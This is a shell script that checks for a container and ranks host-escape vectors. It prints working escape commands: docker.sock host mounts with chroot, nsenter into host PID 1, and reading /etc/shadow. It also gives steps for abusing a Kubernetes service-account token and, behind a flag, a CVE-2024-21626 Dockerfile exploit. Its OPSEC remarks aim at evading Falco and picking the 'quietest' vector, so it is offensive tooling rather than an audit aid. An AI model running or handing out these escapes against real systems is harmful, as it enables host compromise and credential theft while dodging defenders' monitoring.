#!/bin/sh
# container_escape_check.sh - Detect containerization and rank available host-escape vectors.
#
# Covers: runc Leaky Vessels (CVE-2024-21626), docker.sock mount, privileged/cap surface,
#         cgroup-v1 release_agent, --pid=host + CAP_SYS_PTRACE (nsenter), host volume/proc mounts,
#         and Kubernetes service-account-token enumeration.
#
# USAGE:
#   ./container_escape_check.sh            # detect + rank escape vectors (read-only)
#   ./container_escape_check.sh --runc-poc # additionally print a ready-to-build CVE-2024-21626 Dockerfile
#
# DEPENDENCIES: POSIX sh, standard coreutils. Optional: docker/kubectl/curl/nsenter on the host.
# OPSEC: Falco / container-workload-protection products are PURPOSE-BUILT to catch these patterns.
#        Confirm scope before running any escape. This script only enumerates.

GREEN='\033[92m'; RED='\033[91m'; YEL='\033[93m'; CYN='\033[96m'; RST='\033[0m'
[ -t 1 ] || { GREEN=''; RED=''; YEL=''; CYN=''; RST=''; }

RUNC_POC=0
[ "$1" = "--runc-poc" ] && RUNC_POC=1

hi(){ printf "%b[HIGH]%b %s\n" "$RED" "$RST" "$1"; }
md(){ printf "%b[MED ]%b %s\n" "$YEL" "$RST" "$1"; }
nf(){ printf "%b[info]%b %s\n" "$CYN" "$RST" "$1"; }

printf "%bcontainer_escape_check.sh%b  $(date -u '+%Y-%m-%dT%H:%M:%SZ')\n" "$CYN" "$RST"
printf "uid: %s\n" "$(id)"

# ---- Are we in a container? ----------------------------------------------
printf "\n%b=== Containerization ===%b\n" "$CYN" "$RST"
INCONTAINER=0
if grep -qiE 'docker|kubepods|lxc|containerd|libpod' /proc/1/cgroup 2>/dev/null; then INCONTAINER=1; fi
[ -f /.dockerenv ] && INCONTAINER=1
[ -f /run/.containerenv ] && INCONTAINER=1
if [ "$INCONTAINER" -eq 1 ]; then
  hi "Running inside a container"
  grep -iE 'docker|kubepods|lxc|containerd|libpod' /proc/1/cgroup 2>/dev/null | head -3 | sed 's/^/       /'
  case "$(cat /proc/1/cgroup 2>/dev/null)" in *kubepods*) nf "Looks like a Kubernetes pod" ;; esac
else
  nf "Not obviously containerized - this script targets container hosts"
fi

# ---- Capabilities ---------------------------------------------------------
printf "\n%b=== Capabilities ===%b\n" "$CYN" "$RST"
CAPEFF=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
nf "CapEff=$CAPEFF  (decode: capsh --decode=$CAPEFF)"
case "$CAPEFF" in
  0000003fffffffff|000001ffffffffff|0000001fffffffff|ffffffffffffffff)
    hi "Full / near-full capability set -> likely --privileged" ;;
esac
# specific dangerous caps via capsh if available
if command -v capsh >/dev/null 2>&1 && [ -n "$CAPEFF" ]; then
  DEC=$(capsh --decode="$CAPEFF" 2>/dev/null)
  case "$DEC" in
    *cap_sys_admin*) hi "CAP_SYS_ADMIN present -> cgroup release_agent escape / mount tricks" ;;
  esac
  case "$DEC" in
    *cap_sys_ptrace*) hi "CAP_SYS_PTRACE present -> inject into host processes (with --pid=host)" ;;
  esac
  case "$DEC" in
    *cap_dac_read_search*) md "CAP_DAC_READ_SEARCH -> read any host file reachable in mnt ns" ;;
  esac
  printf "       %s\n" "$DEC"
fi

# ---- Docker socket --------------------------------------------------------
printf "\n%b=== Docker socket ===%b\n" "$CYN" "$RST"
if [ -S /var/run/docker.sock ] || [ -S /run/docker.sock ]; then
  SOCK=/var/run/docker.sock; [ -S /run/docker.sock ] && SOCK=/run/docker.sock
  hi "docker.sock mounted: $SOCK"
  if [ -w "$SOCK" ]; then
    hi "docker.sock is WRITABLE -> trivial host root:"
    printf "       docker -H unix://%s run -v /:/host -it alpine chroot /host bash\n" "$SOCK"
    printf "       (no client?) curl -s --unix-socket %s http://localhost/containers/json\n" "$SOCK"
  fi
else
  nf "no docker.sock mounted"
fi

# ---- runc version (CVE-2024-21626) ----------------------------------------
printf "\n%b=== runc Leaky Vessels (CVE-2024-21626) ===%b\n" "$CYN" "$RST"
RUNC_BIN=$(command -v runc 2>/dev/null)
if [ -n "$RUNC_BIN" ]; then
  RV=$("$RUNC_BIN" --version 2>/dev/null | grep -oE 'runc version [0-9]+\.[0-9]+\.[0-9]+' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+')
  nf "runc version: ${RV:-unknown}"
  if [ -n "$RV" ]; then
    A=$(echo "$RV"|cut -d. -f1); B=$(echo "$RV"|cut -d. -f2); C=$(echo "$RV"|cut -d. -f3)
    if [ "$A" -lt 1 ] || { [ "$A" -eq 1 ] && [ "$B" -lt 1 ]; } || { [ "$A" -eq 1 ] && [ "$B" -eq 1 ] && [ "$C" -le 11 ]; }; then
      hi "runc <= 1.1.11 -> vulnerable to CVE-2024-21626 fd-leak escape"
    else
      printf "%b[ok]%b runc >= 1.1.12 (patched)\n" "$GREEN" "$RST"
    fi
  fi
else
  md "runc binary not visible from container; vuln likely depends on host runc. Try the WORKDIR /proc/self/fd/N image PoC."
fi

# ---- cgroup release_agent surface (v1) ------------------------------------
printf "\n%b=== cgroup v1 release_agent ===%b\n" "$CYN" "$RST"
if mount | grep -q 'type cgroup '; then
  nf "cgroup v1 controllers present"
  if command -v capsh >/dev/null 2>&1 && capsh --decode="$CAPEFF" 2>/dev/null | grep -q cap_sys_admin; then
    hi "CAP_SYS_ADMIN + cgroup v1 -> release_agent host command execution viable"
    printf "       see container-namespace-escape.md (release_agent technique)\n"
  fi
else
  nf "no cgroup v1 controllers mountable (cgroup v2 only -> release_agent path closed)"
fi

# ---- Host PID namespace / nsenter -----------------------------------------
printf "\n%b=== Host PID namespace ===%b\n" "$CYN" "$RST"
PID1=$(ps -p 1 -o comm= 2>/dev/null)
NPROC=$(ps -e 2>/dev/null | wc -l)
nf "PID 1 = ${PID1:-unknown}; visible procs = $NPROC"
if [ "$NPROC" -gt 50 ] || [ "$PID1" = "systemd" ] || [ "$PID1" = "init" ]; then
  hi "Likely --pid=host (host PID 1 visible) -> nsenter escape:"
  printf "       nsenter -t 1 -m -u -i -n -p -- /bin/bash\n"
  printf "       or read host files: cat /proc/1/root/etc/shadow\n"
fi

# ---- Host volume / proc mounts --------------------------------------------
printf "\n%b=== Suspicious mounts ===%b\n" "$CYN" "$RST"
mount | grep -E '/host|/ on |hostPath|sysrq' | grep -viE 'overlay|proc on /proc ' | head -10 | sed 's/^/       /'
if [ -w /proc/sysrq-trigger ]; then md "/proc/sysrq-trigger writable -> can crash/reboot host (DoS)"; fi

# ---- Kubernetes -----------------------------------------------------------
printf "\n%b=== Kubernetes ===%b\n" "$CYN" "$RST"
SATOK=/var/run/secrets/kubernetes.io/serviceaccount/token
if [ -f "$SATOK" ]; then
  hi "Service-account token present: $SATOK"
  NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
  nf "namespace: ${NS:-unknown}; API: https://kubernetes.default.svc"
  printf "       TOKEN=\$(cat %s)\n" "$SATOK"
  printf "       kubectl auth can-i --list --token=\$TOKEN  # enumerate SA rights\n"
  printf "       If can create pods -> schedule privileged hostPath:/ pod (see reference file)\n"
  if command -v kubectl >/dev/null 2>&1; then
    nf "kubectl present in image"
  fi
else
  nf "no Kubernetes SA token"
fi

# ---- runc PoC Dockerfile ---------------------------------------------------
if [ "$RUNC_POC" -eq 1 ]; then
  printf "\n%b=== CVE-2024-21626 malicious-image PoC (build on attacker side) ===%b\n" "$CYN" "$RST"
  cat <<'EOF'
# Dockerfile - brute the leaked host-cwd fd (usually 7,8,9). Proves host FS access by reading shadow.
FROM alpine:3.19
WORKDIR /proc/self/fd/8
RUN ["/bin/sh","-c","cd ../../.. && cat etc/shadow > /escaped_shadow 2>/dev/null; \
     echo escaped; ls -la etc/ | head"]
# If fd 8 is wrong, iterate WORKDIR /proc/self/fd/7 ... /15 . Patched runc (>=1.1.12) -> no host access.
# runc exec vector (need runtime access):
#   runc exec --cwd /proc/self/fd/7 <container-id> /bin/sh -c 'cat /../../../etc/shadow'
EOF
fi

printf "\n%bDone.%b Pick the quietest viable vector; container-escape telemetry is heavily monitored.\n" "$GREEN" "$RST"
